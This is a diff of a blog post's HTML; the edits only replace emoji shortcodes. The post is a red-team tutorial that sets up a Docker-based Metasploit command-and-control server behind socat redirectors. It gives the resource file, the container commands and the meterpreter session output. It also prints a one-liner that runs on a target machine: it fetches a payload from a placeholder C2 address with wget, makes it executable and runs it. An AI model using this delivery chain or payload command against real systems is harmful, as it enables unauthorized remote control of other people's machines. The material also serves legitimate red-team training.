@@ -6,7 +6,7 @@
     
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="description" content="Abstract Setup :wrench:  Docker Socat Metasploit   Running the delivery chain :boom: Delivering and communicating with https :lock: Notes  Abstract We want to run a simple C2 that is not exposed to the internet, with multiple socats redirecting our payload delivery and session handling correctly. All this with the help of docker.
+<meta name="description" content="Abstract Setup 🔧  Docker Socat Metasploit   Running the delivery chain 💥 Delivering and communicating with https 🔒 Notes  Abstract We want to run a simple C2 that is not exposed to the internet, with multiple socats redirecting our payload delivery and session handling correctly. All this with the help of docker.
 It&amp;rsquo;s straightforward once you&amp;rsquo;ve gotten the grip.
 Why
 Using containers means we get the &amp;ldquo;it always works&amp;rdquo; factor, compared to manual installs."/>
@@ -146,15 +146,15 @@ Using containers means we get the &amp;ldquo;it always works&amp;rdquo; factor, 
       
       <ul>
 <li><a href="#abstract">Abstract</a></li>
-<li><a href="#setup-">Setup :wrench:</a>
+<li><a href="#setup-">Setup 🔧</a>
 <ul>
 <li><a href="#docker">Docker</a></li>
 <li><a href="#socat">Socat</a></li>
 <li><a href="#metasploit">Metasploit</a></li>
 </ul>
 </li>
-<li><a href="#running-the-delivery-chain-">Running the delivery chain :boom:</a></li>
-<li><a href="#delivering-and-communicating-with-https-">Delivering and communicating with https :lock:</a></li>
+<li><a href="#running-the-delivery-chain-">Running the delivery chain 💥</a></li>
+<li><a href="#delivering-and-communicating-with-https-">Delivering and communicating with https 🔒</a></li>
 <li><a href="#notes">Notes</a></li>
 </ul>
 <h2 id="abstract">Abstract</h2>
@@ -192,10 +192,10 @@ Docker greatly facilites abstraction of networking and volumes, and makes for ea
 </tbody>
 </table>
 <p>For our C2, we&rsquo;re going to use Metasploit with the reverse_http meterpreter.</p>
-<p>:star: <strong>These instructions also work with the <code>meterpreter_reverse_https</code> and <code>meterpreter_reverse_tcp</code> payloads as is.</strong></p>
+<p>⭐ <strong>These instructions also work with the <code>meterpreter_reverse_https</code> and <code>meterpreter_reverse_tcp</code> payloads as is.</strong></p>
 <p>We&rsquo;re using the http variant so as to see all the traffic in cleartext at each step for live fiddling. Prefer encrypted channels when performing exercises.</p>
 <p>In our case, the payload is served on port 443, but using http. You can add an SSL certificat, explained later <a href="#delivering-and-communicating-with-https-">here</a>.</p>
-<h2 id="setup-wrench">Setup :wrench:</h2>
+<h2 id="setup-">Setup 🔧</h2>
 <h3 id="docker">Docker</h3>
 <p>This post won&rsquo;t introduce docker as there is plenty of excellent write-ups. For this post, you need to have a grasp on docker networks, volumes, and to be able to run the <code>hello-world</code> container.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker">$ docker run hello-world <span style="color:#75715e"># Hello from docker</span><span style="color:#960050;background-color:#1e0010">
@@ -205,9 +205,9 @@ Docker greatly facilites abstraction of networking and volumes, and makes for ea
 <p>We&rsquo;re now going to create two different socat containers, one for each route.<br>
 We&rsquo;re going to launch our two socat containers as daemons.</p>
 <p>Socat will natively resolve the <code>msf</code> container hostname since they will all be in the internal <em>c2-net</em> network.</p>
-<p>:small_blue_diamond: The first one, redirecting port 443 to our Metasploit web_delivery server on port 8080:</p>
+<p>🔹 The first one, redirecting port 443 to our Metasploit web_delivery server on port 8080:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker">$ docker run --rm -d -p 443:443 --network<span style="color:#f92672">=</span>c2-net --name socat_delivery alpine/socat -v TCP4-LISTEN:443,fork TCP4:msf:8080<span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p>:small_blue_diamond: The second one for our meterpreter session, from port 80 to the Metasploit handler on port 4444:</p>
+</span></code></pre></div><p>🔹 The second one for our meterpreter session, from port 80 to the Metasploit handler on port 4444:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker">$ docker run --rm -d -p 80:80 --network<span style="color:#f92672">=</span>c2-net --name socat_handler alpine/socat -v TCP4-LISTEN:80,fork TCP4:msf:4444<span style="color:#960050;background-color:#1e0010">
 </span></code></pre></div><p>The containers are now running in the background. I&rsquo;ve launched them with the optional verbose argument for easier fiddling.</p>
 <p>To view the logs, you can either:</p>
@@ -235,7 +235,7 @@ set LURI handler
 set LPORT 80
 set LHOST YOUR-C2-EXT-IP 
 set ReverseListenerBindPort 4444
-</code></pre><p>:small_blue_diamond: And now launch the Metasploit container:</p>
+</code></pre><p>🔹 And now launch the Metasploit container:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ docker run --rm -it -v <span style="color:#e6db74">`</span>pwd<span style="color:#e6db74">`</span>/docker_delivery.rc:/opt/metasploit-framework/docker_delivery.rc --network<span style="color:#f92672">=</span>c2-net --name msf phocean/msf  
 
  * Starting PostgreSQL <span style="color:#ae81ff">10</span> database server                                                                 <span style="color:#f92672">[</span> OK <span style="color:#f92672">]</span> 
@@ -250,7 +250,7 @@ msf &gt; show advanced
 
 <span style="color:#75715e"># Hold the trigger a bit longer in case you wish to make last second changes</span>
 msf &gt; run
-</code></pre></div><h2 id="running-the-delivery-chain-boom">Running the delivery chain :boom:</h2>
+</code></pre></div><h2 id="running-the-delivery-chain-">Running the delivery chain 💥</h2>
 <p>Once everything looks okay, launch the web_delivery script with <code>run</code>.</p>
 <p>Metasploit will output a useful command to run directly on your target to fetch and execute the meterpreter payload.<br>
 Metasploit will output a bind error, and bind directly on 0.0.0.0. It&rsquo;s okay, the container environment just confused it a bit.</p>
@@ -265,7 +265,7 @@ Metasploit will output a bind error, and bind directly on 0.0.0.0. It&rsquo;s ok
 <span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Run</span> the following command on the target <span style="color:#e6db74">machine</span>:
 wget <span style="color:#f92672">-</span>qO <span style="color:#ae81ff">0976</span>ysRZ <span style="color:#f92672">--</span>no<span style="color:#f92672">-</span>check<span style="color:#f92672">-</span>certificate <span style="color:#e6db74">http</span>:<span style="color:#e6db74">//</span><span style="color:#66d9ef">YOUR</span><span style="color:#f92672">-</span><span style="color:#66d9ef">C2</span><span style="color:#f92672">-</span><span style="color:#66d9ef">EXTERNAL</span><span style="color:#f92672">-</span><span style="color:#e6db74">IP</span>:<span style="color:#ae81ff">8080</span><span style="color:#f92672">/</span>delivery; chmod <span style="color:#f92672">+</span>x <span style="color:#ae81ff">0976</span>ysRZ; <span style="color:#f92672">.</span>/<span style="color:#ae81ff">0976</span>ysRZ<span style="color:#f92672">&amp;</span>
 </code></pre></div><p><strong>We&rsquo;re going to change that final command to run on the target with the correct options.</strong> In this scenario, we launched a simple reverse_http served on port 443 (and not served by https).</p>
-<p>:small_blue_diamond: On the target machine:</p>
+<p>🔹 On the target machine:</p>
 <pre><code>$  wget -qO 0976ysRZ --no-check-certificate http://YOUR-C2-EXT-IP:443/delivery; chmod +x 0976ysRZ; ./0976ysRZ&amp;
 </code></pre><p>And here is the output from the Metasploit container:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">msf</span> <span style="color:#a6e22e">exploit</span>(<span style="color:#a6e22e">multi</span><span style="color:#f92672">/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">/</span><span style="color:#a6e22e">web_delivery</span>) <span style="color:#f92672">&gt;</span>
@@ -284,7 +284,7 @@ wget <span style="color:#f92672">-</span>qO <span style="color:#ae81ff">0976</sp
   <span style="color:#f92672">--</span>  <span style="color:#f92672">----</span>  <span style="color:#f92672">----</span>                   <span style="color:#f92672">-----------</span>  <span style="color:#f92672">----------</span>
   <span style="color:#ae81ff">1</span>         <span style="color:#a6e22e">meterpreter</span> <span style="color:#a6e22e">x64</span><span style="color:#f92672">/</span><span style="color:#a6e22e">linux</span>               <span style="color:#ae81ff">127.0.0.1</span> <span style="color:#f92672">-&gt;</span> <span style="color:#ae81ff">172.23.0.4</span><span style="color:#f92672">:</span><span style="color:#ae81ff">54876</span> (<span style="color:#ae81ff">172.23.0.4</span>)
 
-</code></pre></div><h2 id="delivering-and-communicating-with-https-lock">Delivering and communicating with https :lock:</h2>
+</code></pre></div><h2 id="delivering-and-communicating-with-https-">Delivering and communicating with https 🔒</h2>
 <p>To add https, no further socat configuration is required, since we chose port 443 for delivery earlier.</p>
 <p>The SSL certificate can be used:</p>
 <ul>
@@ -348,9 +348,9 @@ msf exploit(multi/script/web_delivery) &gt; set stagerverifysslcert true
 </ul>
 <pre><code>$ docker network connect c2-net new-msf
 </code></pre><hr>
-<p>:thought_balloon: <em>I&rsquo;ll hopefully be posting more about using docker-based red team infrastructures, as there is still plenty of things to talk about. Also, if you spot a mistake, feel free to let me know.</em><br>
+<p>💭 <em>I&rsquo;ll hopefully be posting more about using docker-based red team infrastructures, as there is still plenty of things to talk about. Also, if you spot a mistake, feel free to let me know.</em><br>
 <em>Follow me on <a href="https://twitter.com/kh4st3x">Twitter</a> if you wish to stay updated!</em></p>
-<p>Thank you for reading :purple_heart:</p>
+<p>Thank you for reading 💜</p>
 
     </div>
     
